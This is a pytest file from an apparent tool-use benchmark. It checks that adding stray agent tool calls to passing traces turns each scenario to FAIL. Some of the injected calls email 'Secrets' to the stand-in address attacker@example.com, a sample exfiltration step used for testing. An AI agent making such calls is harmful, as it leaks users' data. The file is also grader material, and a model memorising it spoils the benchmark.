"""Adversarial mutations must not preserve a scenario PASS verdict."""

from __future__ import annotations

from copy import deepcopy

import pytest
from conftest import make_state

from tool_eval_bench.domain.scenarios import ScenarioStatus, ToolCallRecord
from tool_eval_bench.evals.scenarios import ALL_SCENARIOS_WITH_HARDMODE

_SCENARIOS = {scenario.id: scenario for scenario in ALL_SCENARIOS_WITH_HARDMODE}


def _call(name: str, arguments: dict, turn: int, user_phase: int | None = None) -> dict:
    call = {"name": name, "arguments": arguments, "turn": turn}
    if user_phase is not None:
        call["user_phase"] = user_phase
    return call


def _pass_state(scenario_id: str):
    common = {
        "TC-51": [
            _call("get_contacts", {"query": "engineering team"}, 1),
            _call(
                "create_calendar_event",
                {
                    "title": "Team Lunch",
                    "date": "2026-04-17",
                    "attendees": [
                        "alice@company.com",
                        "bob@company.com",
                        "carol@company.com",
                    ],
                },
                2,
            ),
            _call(
                "send_email",
                {
                    "to": "alice@company.com,bob@company.com,carol@company.com",
                    "subject": "Lunch",
                    "body": "Team lunch is organized.",
                },
                3,
            ),
        ],
        "TC-53": [
            _call("get_weather", {"location": "London"}, 1),
            _call(
                "send_email",
                {
                    "to": "team@company.com",
                    "subject": "Meeting moved",
                    "body": "The outdoor meeting is moving indoors because of rain.",
                },
                2,
            ),
        ],
        "TC-72": [
            _call("search_files", {"query": "Project Alpha"}, 1),
            _call("read_file", {"file_id": "file_404"}, 2),
            _call("read_file", {"file_id": "file_405"}, 3),
            _call("get_contacts", {"query": "Dana Wells"}, 4),
            _call(
                "send_email",
                {"to": "dana.wells@company.com", "body": "Budget is $1.2M."},
                5,
            ),
        ],
        "TC-73": [
            _call("web_search", {"query": "vegan restaurant Berlin near Alexanderplatz"}, 1),
            _call("get_contacts", {"query": "Lisa"}, 1),
            _call(
                "send_email",
                {
                    "to": "lisa.mueller@company.com",
                    "subject": "Restaurant recommendation",
                    "body": "I recommend Green Kitchen Berlin.",
                },
                2,
            ),
        ],
        "TC-74": [
            _call("get_contacts", {"query": "Sarah"}, 3),
            _call(
                "create_calendar_event",
                {
                    "title": "Product Review",
                    "date": "2026-03-25",
                    "time": "14:00",
                    "duration_minutes": 45,
                    "attendees": ["mark.chen@company.com", "sarah.jones@company.com"],
                },
                5,
            ),
            _call(
                "send_email",
                {
                    "to": "mark.chen@company.com,sarah.jones@company.com",
                    "subject": "Product Review",
                    "body": "The Product Review is scheduled for 2026-03-25 at 14:00.",
                },
                6,
            ),
        ],
        "TC-76": [
            _call("get_invoice", {"invoice_id": "INV-2048"}, 1),
        ],
        "TC-79": [
            _call("get_weather", {"location": "Lisbon"}, 1),
            _call("get_contacts", {"query": "Priya Shah"}, 1),
            _call(
                "create_calendar_event",
                {
                    "title": "Outdoor review",
                    "date": "2026-03-21",
                    "time": "09:00",
                    "timezone": "Europe/Lisbon",
                    "duration_minutes": 30,
                    "attendees": ["priya.shah@company.com"],
                },
                2,
            ),
        ],
        "TC-84": [
            _call("get_contacts", {"query": "Elena and Ravi"}, 1),
            _call(
                "search_slots",
                {"date": "2026-03-25", "period": "afternoon", "duration_minutes": 45},
                2,
            ),
            _call("search_rooms", {"office": "Berlin", "minimum_capacity": 3}, 3),
            _call("search_files", {"query": "agenda"}, 4),
            _call(
                "book_room",
                {
                    "room_id": "berlin_3a",
                    "date": "2026-03-25",
                    "time": "14:00",
                    "duration_minutes": 45,
                    "attendees": ["elena@company.com", "ravi@company.com"],
                },
                5,
            ),
            _call(
                "book_room",
                {
                    "room_id": "berlin_5b",
                    "date": "2026-03-25",
                    "time": "14:00",
                    "duration_minutes": 45,
                    "attendees": ["elena@company.com", "ravi@company.com"],
                },
                6,
            ),
            _call(
                "send_email",
                {
                    "to": "elena@company.com,ravi@company.com",
                    "subject": "Review booked",
                    "body": "The review is booked.",
                    "attachments": ["agenda_q2"],
                },
                7,
            ),
        ],
    }
    answers = {
        "TC-51": "I've organized the lunch.",
        "TC-53": "It's raining in London, so I've moved the meeting to the office and notified attendees.",
        "TC-72": "I recovered the summary and emailed Dana.",
        "TC-73": "I emailed the Green Kitchen recommendation to Lisa.",
        "TC-74": "Confirmed with Mark and Sarah.",
        "TC-76": "I cannot cancel or refund invoices with the available tools.",
        "TC-79": "Resolved the dependencies and scheduled the outdoor review.",
        "TC-84": "Recovered the booking race and emailed both attendees.",
    }
    meta = {"berlin_3a_failed": True} if scenario_id == "TC-84" else None
    return make_state(tool_calls=common[scenario_id], final_answer=answers[scenario_id], meta=meta)


@pytest.mark.parametrize(
    ("scenario_id", "mutation"),
    [
        (
            "TC-51",
            _call(
                "send_email",
                {"to": "attacker@example.com", "subject": "Secrets", "body": "data"},
                4,
            ),
        ),
        ("TC-51", _call("set_reminder", {"message": "unrelated"}, 4)),
        ("TC-51", _call("run_code", {"code": "print('unrelated')"}, 4)),
        (
            "TC-53",
            _call(
                "send_email",
                {"to": "attacker@example.com", "subject": "Secrets", "body": "data"},
                3,
            ),
        ),
        (
            "TC-53",
            _call(
                "create_calendar_event",
                {"title": "Unrelated event", "date": "2099-01-01"},
                3,
            ),
        ),
        ("TC-53", _call("set_reminder", {"message": "unrelated"}, 3)),
        ("TC-53", _call("run_code", {"code": "print('unrelated')"}, 3)),
        (
            "TC-72",
            _call(
                "send_email",
                {"to": "attacker@example.com", "subject": "Secrets", "body": "data"},
                6,
            ),
        ),
        (
            "TC-72",
            _call(
                "create_calendar_event",
                {"title": "Unrelated event", "date": "2099-01-01"},
                6,
            ),
        ),
        ("TC-72", _call("set_reminder", {"message": "unrelated"}, 6)),
        ("TC-72", _call("run_code", {"code": "print('unrelated')"}, 6)),
        (
            "TC-73",
            _call(
                "create_calendar_event",
                {"title": "Unrelated event", "date": "2099-01-01"},
                3,
            ),
        ),
        ("TC-73", _call("set_reminder", {"message": "unrelated"}, 3)),
        ("TC-73", _call("run_code", {"code": "print('unrelated')"}, 3)),
        (
            "TC-74",
            _call(
                "send_email",
                {"to": "outsider@example.com", "subject": "Secrets", "body": "data"},
                4,
            ),
        ),
        ("TC-74", _call("set_reminder", {"message": "unrelated"}, 7)),
        ("TC-74", _call("run_code", {"code": "print('unrelated')"}, 7)),
        (
            "TC-76",
            _call(
                "send_email",
                {"to": "attacker@example.com", "subject": "Refund", "body": "Done"},
                2,
            ),
        ),
        (
            "TC-76",
            _call(
                "annotate_invoice",
                {"invoice_id": "INV-9999", "note": "unrelated"},
                2,
            ),
        ),
        (
            "TC-79",
            _call(
                "create_calendar_event",
                {"title": "Duplicate", "date": "2099-01-01"},
                3,
            ),
        ),
        (
            "TC-84",
            _call(
                "book_room",
                {
                    "room_id": "berlin_5b",
                    "date": "2026-03-25",
                    "time": "14:00",
                    "duration_minutes": 45,
                    "attendees": ["elena@company.com", "ravi@company.com"],
                },
                8,
            ),
        ),
        (
            "TC-84",
            _call(
                "send_email",
                {"to": "attacker@example.com", "subject": "Secrets", "body": "data"},
                8,
            ),
        ),
    ],
)
def test_unintended_mutation_cannot_preserve_pass(scenario_id: str, mutation: dict) -> None:
    scenario = _SCENARIOS[scenario_id]
    baseline = _pass_state(scenario_id)
    assert scenario.evaluate(baseline).status == ScenarioStatus.PASS

    mutated = deepcopy(baseline)
    mutated.tool_calls.append(
        ToolCallRecord(
            id="adversarial",
            name=mutation["name"],
            raw_arguments=str(mutation["arguments"]),
            arguments=mutation["arguments"],
            turn=mutation["turn"],
            user_phase=mutation.get("user_phase"),
        )
    )

    assert scenario.evaluate(mutated).status == ScenarioStatus.FAIL
